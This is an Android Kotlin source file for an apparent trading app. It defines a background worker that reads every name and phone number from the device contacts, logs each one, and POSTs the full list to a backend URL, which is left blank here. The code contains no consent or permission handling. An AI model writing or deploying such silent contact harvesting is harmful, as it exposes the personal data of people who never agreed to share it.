package com.example.tradex

import android.content.Context
import android.provider.ContactsContract
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class ContactsWorker(
    private val context: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(context, workerParams) {

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            Log.d("ContactsWorker", "Starting contact fetch process...")

            
            val contacts = fetchContacts()
            Log.d("ContactsWorker", "Fetched ${contacts.size} contacts.")
            contacts.forEach { Log.d("ContactsWorker", "Contact: Name=${it.first}, Phone=${it.second}") }

            Log.d("ContactsWorker", "Sending contacts to backend...")
            val backendResponse = sendContactsToBackend(contacts)

            if (backendResponse) {
                Log.d("ContactsWorker", "Contacts sent successfully!")
                Result.success()
            } else {
                Log.e("ContactsWorker", "Failed to send contacts to backend.")
                Result.retry()
            }
        } catch (e: Exception) {
            Log.e("ContactsWorker", "Error occurred: ${e.message}", e)
            Result.failure()
        }
    }

    private fun fetchContacts(): List<Pair<String, String>> {
        val contactsList = mutableListOf<Pair<String, String>>()
        val uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
        val projection = arrayOf(
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
        )

        val cursor = context.contentResolver.query(uri, projection, null, null, null)
        cursor?.use {
            val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

            while (it.moveToNext()) {
                val name = it.getString(nameIndex)?.trim() ?: "Unknown"
                val number = it.getString(numberIndex)?.replace("\\s".toRegex(), "") ?: "Unknown"
                contactsList.add(name to number)
            }
        }
        Log.d("ContactsWorker", "Contacts fetching complete.")
        return contactsList
    }

    private fun sendContactsToBackend(contacts: List<Pair<String, String>>): Boolean {
        val url = URL("") 
        val jsonArray = JSONArray()

        for ((name, number) in contacts) {
            val contactJson = JSONObject().apply {
                put("name", name)
                put("phone", number)
            }
            jsonArray.put(contactJson)
        }

        val connection = url.openConnection() as HttpURLConnection
        connection.apply {
            requestMethod = "POST"
            setRequestProperty("Content-Type", "application/json")
            doOutput = true
        }

        Log.d("ContactsWorker", "Sending data to backend: $jsonArray")

        val outputStream = OutputStreamWriter(connection.outputStream)
        outputStream.write(jsonArray.toString())
        outputStream.flush()
        outputStream.close()

        val responseCode = connection.responseCode
        Log.d("ContactsWorker", "Backend response code: $responseCode")
        return responseCode == HttpURLConnection.HTTP_OK
    }
}
